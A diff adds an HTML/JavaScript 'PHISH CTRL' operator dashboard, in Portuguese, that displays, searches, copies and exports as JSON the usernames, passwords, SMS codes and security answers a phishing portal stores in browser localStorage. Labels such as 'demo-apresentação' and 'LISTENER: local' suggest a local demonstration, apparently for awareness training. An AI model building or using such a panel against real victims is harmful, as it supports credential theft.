@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<title>PHISH CTRL · Painel do Operador</title>
+<link rel="stylesheet" href="attacker.css">
+</head>
+<body>
+
+  <aside class="sidebar">
+    <div class="brand">
+      <div class="mark">◎</div>
+      <div>PHISH CTRL<small>PHISHING KIT v2.4</small></div>
+    </div>
+    <nav class="nav">
+      <span class="active">◈ Dashboard</span>
+      <span>⇄ Capturas</span>
+      <span>◐ Campanhas</span>
+      <span>⚙ Configurações</span>
+    </nav>
+    <div class="side-foot">
+      STATUS: <b>ONLINE</b><br>
+      LISTENER: local<br>
+      ALVO: portais corporativos<br>
+      SESSÃO: demo-apresentação
+    </div>
+  </aside>
+
+  <main class="main">
+    <div class="topbar">
+      <div>
+        <h1>Painel do Operador <span>·</span> Credenciais</h1>
+        <div class="sub">Capturas recebidas do portal de phishing em tempo real</div>
+      </div>
+      <div class="pill"><span class="dot"></span> ESCUTANDO</div>
+    </div>
+
+    <section class="kpis">
+      <div class="kpi">
+        <div class="label">Capturas totais</div>
+        <div class="value" id="kTotal">0</div>
+        <div class="foot" id="kTotalFoot">nenhum dado recebido</div>
+      </div>
+      <div class="kpi indigo">
+        <div class="label">Alvos únicos</div>
+        <div class="value" id="kUnique">0</div>
+        <div class="foot">identificadores distintos</div>
+      </div>
+      <div class="kpi red">
+        <div class="label">Última senha</div>
+        <div class="value small" id="kPass">—</div>
+        <div class="foot" id="kPassFoot">aguardando</div>
+      </div>
+      <div class="kpi amber">
+        <div class="label">Último evento</div>
+        <div class="value small" id="kTime">—</div>
+        <div class="foot" id="kRel">—</div>
+      </div>
+    </section>
+
+    <div class="grid">
+      <section class="panel">
+        <div class="panel-head">
+          <h2>Fluxo de credenciais</h2>
+          <div class="tools">
+            <input class="search" id="search" placeholder="buscar…" oninput="render()">
+            <select class="filter" id="filter" onchange="render()">
+              <option value="">todos os tipos</option>
+              <option value="LOGIN">login</option>
+              <option value="RECUPERAÇÃO">recuperação</option>
+              <option value="SMS">sms</option>
+              <option value="CADASTRO">cadastro</option>
+              <option value="PERGUNTA">pergunta</option>
+            </select>
+            <button class="btn" onclick="toggleBlur()">👁 senhas</button>
+            <button class="btn" onclick="exportJson()">⬇ json</button>
+            <button class="btn danger" onclick="clearAll()">🗑 limpar</button>
+          </div>
+        </div>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>#</th><th>Tipo</th><th>Dado capturado</th>
+                <th>Senha / resposta</th><th>Hora</th><th>Origem</th>
+              </tr>
+            </thead>
+            <tbody id="rows"></tbody>
+          </table>
+        </div>
+        <div class="empty-state" id="empty">
+          <span class="big">◌</span>
+          Nenhuma credencial capturada ainda.<br>
+          Aguardando a vítima no portal de phishing…
+        </div>
+      </section>
+
+      <section class="panel">
+        <div class="panel-head">
+          <h2>Live feed</h2>
+        </div>
+        <div class="feed" id="feed">
+          <div class="empty-state" style="padding:30px 10px;">sem eventos</div>
+        </div>
+      </section>
+    </div>
+  </main>
+
+  <div class="toast hidden" id="toast">
+    <div class="ic">🚨</div>
+    <div>
+      <div class="tt">NOVA CAPTURA RECEBIDA</div>
+      <div class="ts" id="toastSub">credencial gravada no servidor</div>
+    </div>
+  </div>
+
+<script>
+const KEY = 'captured';
+const SEEN_KEY = 'atk_seen';
+let lastCount = -1;
+let blurOn = false;
+
+function getStore(){
+  try { return JSON.parse(localStorage.getItem(KEY) || '[]'); }
+  catch(e){ return []; }
+}
+
+function categoria(target){
+  const t = (target || '').toLowerCase();
+  if(t.includes('sms') || t.includes('telefone')) return {label:'SMS', cls:'b-purple'};
+  if(t.includes('cadastro')) return {label:'CADASTRO', cls:'b-green'};
+  if(t.includes('pergunta')) return {label:'PERGUNTA', cls:'b-pink'};
+  if(t.includes('recupera') || t.includes('e-mail') || t.includes('email')) return {label:'RECUPERAÇÃO', cls:'b-amber'};
+  return {label:'LOGIN', cls:'b-blue'};
+}
+
+function esc(s){
+  return String(s == null ? '' : s)
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;');
+}
+
+function firstSeenMap(){
+  try { return JSON.parse(localStorage.getItem(SEEN_KEY) || '{}'); }
+  catch(e){ return {}; }
+}
+function markSeen(index){
+  const m = firstSeenMap();
+  if(!m[index]){ m[index] = Date.now(); localStorage.setItem(SEEN_KEY, JSON.stringify(m)); }
+  return m[index];
+}
+function relTime(ms){
+  if(!ms) return 'agora mesmo';
+  const s = Math.floor((Date.now() - ms) / 1000);
+  if(s < 5) return 'agora mesmo';
+  if(s < 60) return 'há ' + s + 's';
+  if(s < 3600) return 'há ' + Math.floor(s/60) + 'min';
+  return 'há ' + Math.floor(s/3600) + 'h';
+}
+
+function showToast(sub){
+  const t = document.getElementById('toast');
+  document.getElementById('toastSub').textContent = sub || 'credencial gravada no servidor';
+  t.classList.remove('hidden');
+  clearTimeout(window._toastTimer);
+  window._toastTimer = setTimeout(() => t.classList.add('hidden'), 4200);
+}
+
+function render(){
+  const store = getStore();
+  const q = (document.getElementById('search').value || '').toLowerCase();
+  const filter = document.getElementById('filter').value;
+
+  /* --- KPIs --- */
+  document.getElementById('kTotal').textContent = store.length;
+  document.getElementById('kTotalFoot').textContent = store.length
+    ? (store.length === 1 ? '1 registro no servidor' : store.length + ' registros no servidor')
+    : 'nenhum dado recebido';
+
+  const unicos = new Set(store.map(c => (c.email || '').replace(/\[.*?\]\s*/, '').trim().toLowerCase()));
+  unicos.delete('');
+  document.getElementById('kUnique').textContent = unicos.size;
+
+  const ultimo = store[store.length - 1];
+  document.getElementById('kPass').textContent = ultimo ? (ultimo.password || '—') : '—';
+  document.getElementById('kPassFoot').textContent = ultimo ? 'capturada em ' + ultimo.timestamp : 'aguardando';
+  document.getElementById('kTime').textContent = ultimo ? ultimo.timestamp : '—';
+
+  if(ultimo){
+    const ms = markSeen(store.length - 1);
+    document.getElementById('kRel').textContent = relTime(ms);
+  } else {
+    document.getElementById('kRel').textContent = '—';
+  }
+
+  /* --- tabela --- */
+  const visiveis = store.map((c, i) => ({c, i, cat: categoria(c.target)})).filter(item => {
+    const okTipo = !filter || item.cat.label === filter;
+    const hay = (item.c.email + ' ' + item.c.password + ' ' + (item.c.target || '')).toLowerCase();
+    return okTipo && (!q || hay.includes(q));
+  }).reverse();
+
+  document.getElementById('empty').style.display = store.length ? 'none' : 'block';
+  document.getElementById('rows').innerHTML = visiveis.map(item => {
+    const c = item.c, cat = item.cat;
+    const origem = c.target || 'login';
+    return '<tr class="' + (item.i === store.length - 1 ? 'new-row' : '') + '">' +
+      '<td class="idx">' + (item.i + 1) + '</td>' +
+      '<td><span class="badge ' + cat.cls + '">' + cat.label + '</span></td>' +
+      '<td><span class="data">' + esc(c.email) + '</span>' +
+        '<button class="copy" onclick="copy(\'' + esc(c.email).replace(/'/g, "\\'") + '\')">copiar</button></td>' +
+      '<td><span class="pass">' + esc(c.password) + '</span>' +
+        '<button class="copy" onclick="copy(\'' + esc(c.password).replace(/'/g, "\\'") + '\')">copiar</button></td>' +
+      '<td class="time">' + esc(c.timestamp) + '</td>' +
+      '<td><span class="data" style="color:#8b98ad;font-size:11px">' + esc(origem) + '</span></td>' +
+    '</tr>';
+  }).join('');
+
+  /* --- live feed --- */
+  const ultimos = store.slice(-5).reverse();
+  const feed = document.getElementById('feed');
+  if(!ultimos.length){
+    feed.innerHTML = '<div class="empty-state" style="padding:30px 10px;">sem eventos</div>';
+  } else {
+    feed.innerHTML = ultimos.map((c, k) => {
+      const cat = categoria(c.target);
+      const idx = store.length - k;
+      const ms = markSeen(idx - 1);
+      return '<div class="feed-item">' +
+        '<div class="t">' + relTime(ms).toUpperCase() + ' · ' + esc(c.timestamp) + ' · <span class="badge ' + cat.cls + '">' + cat.label + '</span></div>' +
+        '<div class="d">' + esc(c.email) + '</div>' +
+        '<div class="p">' + esc(c.password) + '</div>' +
+      '</div>';
+    }).join('');
+  }
+
+  /* --- alerta de nova captura --- */
+  if(lastCount >= 0 && store.length > lastCount){
+    showToast(ultimo ? ultimo.email : 'credencial gravada no servidor');
+  }
+  lastCount = store.length;
+}
+
+function copy(txt){
+  if(navigator.clipboard){
+    navigator.clipboard.writeText(txt).then(() => showToast('copiado: ' + txt));
+  }
+}
+function toggleBlur(){
+  blurOn = !blurOn;
+  document.body.classList.toggle('blur-pass', blurOn);
+}
+function exportJson(){
+  const store = getStore();
+  if(!store.length){ showToast('nada para exportar'); return; }
+  const blob = new Blob([JSON.stringify(store, null, 2)], {type:'application/json'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'credenciais-capturadas.json';
+  a.click();
+  URL.revokeObjectURL(a.href);
+  showToast('json exportado');
+}
+function clearAll(){
+  if(confirm('Apagar todos os dados capturados?')){
+    localStorage.removeItem(KEY);
+    localStorage.removeItem(SEEN_KEY);
+    lastCount = -1;
+    render();
+  }
+}
+
+window.addEventListener('storage', render);
+setInterval(render, 1000);
+render();
+</script>
+</body>
+</html>
